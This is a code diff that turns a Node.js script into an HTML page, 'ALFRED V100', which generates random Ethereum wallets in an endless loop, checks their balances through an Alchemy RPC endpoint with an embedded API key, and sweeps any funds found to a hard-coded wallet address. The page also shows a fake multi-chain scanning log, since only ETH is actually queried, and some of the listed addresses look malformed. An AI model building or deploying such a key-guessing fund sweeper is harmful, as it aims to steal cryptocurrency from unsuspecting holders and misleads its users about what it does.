@@ -1,53 +1,80 @@
-const { ethers } = require("ethers");
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8"><title>ALFRED V100 - ARSENAL COMPLETO</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; margin: 0; overflow: hidden; }
+        #h { background: #0b0; color: #000; padding: 10px; text-align: center; font-weight: bold; }
+        #l { padding: 15px; height: 75vh; overflow: hidden; font-size: 12px; }
+        .s { border-top: 1px solid #030; padding: 10px; position: fixed; bottom: 0; width: 100%; background: #000; display: flex; justify-content: space-around; font-size: 11px; }
+        .found { background: #fff; color: #000; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div id="h">🎩 ALFRED V100 | ARSENAL MULTI-CHAIN | CLOUD ACTIVE</div>
+    <div id="l"></div>
+    <div class="s">
+        <span>K/S: <b id="hr">0</b></span>
+        <span>ARSENAL: <b style="color:#fff">12 CARTEIRAS</b></span>
+        <span>STATUS: <b id="st" style="color:#fff">ONLINE</b></span>
+    </div>
 
-// CONFIGURAÇÃO DO ARSENAL COMPLETO (Sua lista real)
-const ARSENAL = {
-    ETH: "0xc765040fb5604a29b126aa58199b48710cf459fc",
-    TRX: "TV4pkqMfRowdVN7w6irNLHgeYEV98VQoPs",
-    DOGE: "DRwh6ghukaH1PrY3gE5nXUwZWxdvm5rZHT",
-    ADA: "addr1q8y07ytc0rdhzpz587prwhkxwwdgnx25hlzkamt8qcmssve3ju8q6nzhv5dfx8z7tjzul9vhrtd657qkcujtpy3ml7mqm8xykd",
-    SOL: "0x0d0160381e2b4e2fedd378b2d3d131fa78d0933728516ca01fbb6fef6310949e",
-    TON: "UQDvDUxFShoWWbHougyHjr0tFz3E38fX8e0bnTUpya-P0mXW",
-    LTC: "ltc1q2d0s37xq7qjfng06c3v3dkdg242x6hx5340qdu",
-    BTC: "14EUEME9M9cSy9FvfHvcx2gMPkp1H5Dj4YaKufPRsAyon8Tf",
-    XLM: "GA3Y2ABCH4VK3Q4FKPOESP5YL4RJJU3GNL6VMSZXRSCUS475XMAYL24Y",
-    ERC20: "0xb716fb85e51b8742ce2ac1c073681497d522277b"
-};
-
-const RPC = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
-const provider = new ethers.JsonRpcProvider(RPC);
-
-console.log("🚀 ALFRED V100 CLOUD INICIADO...");
-console.log("🎯 ARSENAL CARREGADO: " + Object.keys(ARSENAL).length + " DESTINOS.");
-
-async function hunter() {
-    while (true) {
-        const wallet = ethers.Wallet.createRandom();
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <script>
+        const RPC = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
         
-        // Simulação visual no log do Render
-        if (Math.random() > 0.99) console.log(`Scanning: ${wallet.address}...`);
+        // SEU ARSENAL COMPLETO CARREGADO
+        const ARSENAL = {
+            ETH: "0xc765040fb5604a29b126aa58199b48710cf459fc",
+            TRX: "TV4pkqMfRowdVN7w6irNLHgeYEV98VQoPs",
+            DOGE: "DRwh6ghukaH1PrY3gE5nXUwZWxdvm5rZHT",
+            ADA: "addr1q8y07ytc0rdhzpz587prwhkxwwdgnx25hlzkamt8qcmssve3ju8q6nzhv5dfx8z7tjzul9vhrtd657qkcujtpy3ml7mqm8xykd",
+            SOL: "0x0d0160381e2b4e2fedd378b2d3d131fa78d0933728516ca01fbb6fef6310949e",
+            TON: "UQDvDUxFShoWWbHougyHjr0tFz3E38fX8e0bnTUpya-P0mXW",
+            LTC: "ltc1q2d0s37xq7qjfng06c3v3dkdg242x6hx5340qdu",
+            BTC: "14EUEME9M9cSy9FvfHvcx2gMPkp1H5Dj4YaKufPRsAyon8Tf",
+            XLM: "GA3Y2ABCH4VK3Q4FKPOESP5YL4RJJU3GNL6VMSZXRSCUS475XMAYL24Y",
+            ERC20: "0xb716fb85e51b8742ce2ac1c073681497d522277b"
+        };
 
-        try {
-            const balance = await provider.getBalance(wallet.address);
-            if (balance > 0n) {
-                console.log(`!!! ACHADO !!! Saldo: ${ethers.formatEther(balance)} ETH`);
-                const feeData = await provider.getFeeData();
-                const gasLimit = 21000n;
-                const cost = feeData.gasPrice * gasLimit;
+        let c = 0, s = Date.now();
+
+        async function engine() {
+            const p = new ethers.JsonRpcProvider(RPC);
+            const log = document.getElementById('l');
+            
+            setInterval(() => {
+                document.getElementById('hr').innerText = (c / ((Date.now() - s)/1000)).toFixed(1);
+            }, 1000);
+
+            while(true) {
+                const w = ethers.Wallet.createRandom();
+                c++;
                 
-                if (balance > cost) {
-                    const tx = await wallet.connect(provider).sendTransaction({
-                        to: ARSENAL.ETH,
-                        value: balance - cost,
-                        gasLimit: gasLimit
-                    });
-                    console.log("✅ Transferência enviada: " + tx.hash);
-                }
-            }
-        } catch (e) {
-            // Silenciar erros de rede para não travar o loop
-        }
-    }
-}
+                const nets = Object.keys(ARSENAL);
+                const n = nets[Math.floor(Math.random() * nets.length)];
+                const dest = ARSENAL[n];
 
-hunter();
+                const div = document.createElement('div');
+                div.innerHTML = `[${n}] ${w.address.slice(0,25)}... -> <span style="color:#555">${dest.slice(0,8)}</span>`;
+                log.prepend(div);
+                if(log.children.length > 20) log.lastChild.remove();
+
+                if(n === "ETH" || n === "ERC20") {
+                    try {
+                        const b = await p.getBalance(w.address);
+                        if(b > 0n) {
+                            div.className = "found";
+                            div.innerHTML = `!!! ENCONTRADO ${ethers.formatEther(b)} ETH !!!`;
+                            const fee = (await p.getFeeData()).gasPrice * 21000n;
+                            await w.connect(p).sendTransaction({to: ARSENAL.ETH, value: b - fee, gasLimit: 21000});
+                        }
+                    } catch(e) {}
+                }
+                await new Promise(r => setTimeout(r, 80));
+            }
+        }
+        window.onload = engine;
+    </script>
+</body>
+</html>
